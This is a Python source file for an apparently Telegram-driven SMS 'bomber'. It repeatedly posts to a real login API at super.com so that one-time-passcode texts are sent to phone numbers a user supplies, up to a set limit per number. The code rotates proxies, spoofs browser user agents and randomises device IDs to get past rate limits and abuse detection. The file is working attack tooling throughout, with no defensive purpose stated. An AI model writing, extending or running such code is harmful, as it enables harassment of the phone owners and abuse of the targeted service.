import random
import uuid
import time
import logging
import requests
from database import get_db, update_user

logger = logging.getLogger(__name__)

def attack_thread(chat_id, bot):
    chat_id = str(chat_id)
    
    while True:
        db = get_db()
        if chat_id not in db:
            break
            
        user_data = db[chat_id]
        if not user_data["config"]["is_attacking"]:
            bot.send_message(chat_id, "🛑 Attack Stopped.")
            break
            
        numbers = [num for num, data in user_data["numbers"].items() if data["sent"] < user_data["config"]["limit"]]
        
        if not numbers:
            user_data["config"]["is_attacking"] = False
            update_user(chat_id, user_data)
            bot.send_message(chat_id, "✅ All numbers have reached their limit. Attack finished.")
            break
            
        use_proxy = user_data["config"]["use_proxy"]
        proxies = user_data["proxies"]
        wait_time = user_data["config"]["wait_time"]
        
        proxy_index = 0
        
        for number in numbers:
            # Check attack status again
            db = get_db()
            if not db[chat_id]["config"]["is_attacking"]:
                break
                
            current_proxy = None
            if use_proxy and proxies:
                # Cycle proxy for each number
                current_proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
            
            # Send OTP
            success, proxy_used, browser, dev_id = send_otp(number, current_proxy)
            
            if success:
                # Update DB
                db = get_db()
                db[chat_id]["numbers"][number]["sent"] += 1
                sent_count = db[chat_id]["numbers"][number]["sent"]
                limit = db[chat_id]["config"]["limit"]
                update_user(chat_id, db[chat_id])
                
                safe_proxy = proxy_used.split('@')[-1] if proxy_used else "Direct (No Proxy)"
                msg = f"✅ OTP Sent to `{number}`\n📊 Status: {sent_count}/{limit}\n🛡️ Proxy: `{safe_proxy}`\n🌐 Browser: `{browser}` (Device ID: `{dev_id[:8]}`)"
                
                if sent_count >= limit:
                    msg += "\n🎉 **Limit reached for this number. Removing from queue.**"
                    
                bot.send_message(chat_id, msg, parse_mode="Markdown")
            else:
                # Fast retry on proxy fail (Dead proxy handling)
                bot.send_message(chat_id, f"❌ Failed to send OTP to `{number}`. Switching proxy and continuing...")
                continue # Don't wait if failed, go to next
                
            time.sleep(wait_time)

def send_otp(phone_number, proxy_string):
    impersonate_profiles = ["chrome110", "chrome116", "chrome120", "edge101", "safari15_3", "safari15_5"]
    browser_profile = random.choice(impersonate_profiles)
    
    device_id = str(uuid.uuid4())
    request_id = str(uuid.uuid4())
    
    proxy_url = None
    if proxy_string:
        # Expected format: host:port:user:pass
        parts = proxy_string.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"

    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
        
    url = "https://www.super.com/snapcommerce/api/trpc/authentication.cognitoCreateUserOrLogIn"
    
    user_agents = {
        "chrome120": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "chrome116": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "chrome110": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "edge101": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "safari15_5": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "safari15_3": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15"
    }
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.super.com',
        'referer': 'https://www.super.com/',
        'user-agent': user_agents.get(browser_profile, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    }
    
    payload = {
        "body": {
            "request_id": request_id,
            "data": {
                "auth_contact_identifier": {
                    "brand": "ST",
                    "contact_type": "PHONE_NUMBER",
                    "contact_value": phone_number
                },
                "profile": {
                    "device_id": device_id,
                    "platform_data": {
                        "os": "Windows" if "chrome" in browser_profile or "edge" in browser_profile else "macOS"
                    }
                }
            }
        },
        "queryParams": {}
    }
    
    try:
        session.get("https://www.super.com/", headers={'referer': 'https://google.com/'})
        response = session.post(url, headers=headers, json=payload, timeout=10)
        
        if response.status_code == 200:
            return True, proxy_string, browser_profile, device_id
        else:
            return False, proxy_string, browser_profile, device_id
    except Exception as e:
        logger.error(f"Request Error: {e}")
        return False, proxy_string, browser_profile, device_id
